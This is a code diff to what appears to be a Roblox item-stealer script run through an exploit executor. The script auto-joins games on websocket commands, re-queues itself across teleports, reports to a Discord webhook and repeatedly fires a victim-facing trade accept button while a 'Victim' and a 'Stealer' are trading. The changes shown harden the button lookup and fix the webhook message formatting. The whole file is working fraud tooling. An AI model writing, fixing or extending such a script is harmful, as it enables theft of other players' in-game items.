@@ -27,6 +27,7 @@ game:GetService("GuiService").ErrorMessageChanged:Connect(function(text)
 end)
 
 repeat task.wait() until game:IsLoaded()
+local ContextActionService = game:GetService("ContextActionService")
 local LocalPlayer = game:GetService("Players").LocalPlayer
 
 queue_on_teleport([[
@@ -85,8 +86,9 @@ if autjoindata then
                     StealerIsTrading = LocalPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
                     while VictimIsTrading.Value and StealerIsTrading.Value and task.wait(1) do
                         warn("waiting for accept")
-                        local acceptbutton = tradinggui.TradeFrame.ButtonAccept.ButtonTop
-                        if acceptbutton.TextLabel.Text ~= "Unaccept" then
+                        local acceptbutton = tradinggui:FindFirstChild("TradeFrame") and tradinggui.TradeFrame:FindFirstChild("ButtonAccept") and
+                            tradinggui.TradeFrame.ButtonAccept:FindFirstChild("ButtonTop")
+                        if acceptbutton and acceptbutton.TextLabel.Text ~= "Unaccept" then
                             firesignal(acceptbutton.MouseButton1Click)
                             task.wait(1.5)
                         end
@@ -124,7 +126,7 @@ ws.OnMessage:Connect(function(msg)
     writefile(filename, msg)
     spawn(function()
         local Body = game:GetService("HttpService"):JSONEncode({
-            content = "Auto-Join checking " .. string.format("https://discord.com/channels/%d/%d/%d", json.guild_id, json.channel_id, json.message_id)
+            content = "Auto-Join checking " .. string.format("https://discord.com/channels/%s/%s/%s", json.guild_id, json.channel_id, json.message_id)
         })
         http.request({
             Url = AJwebhook,
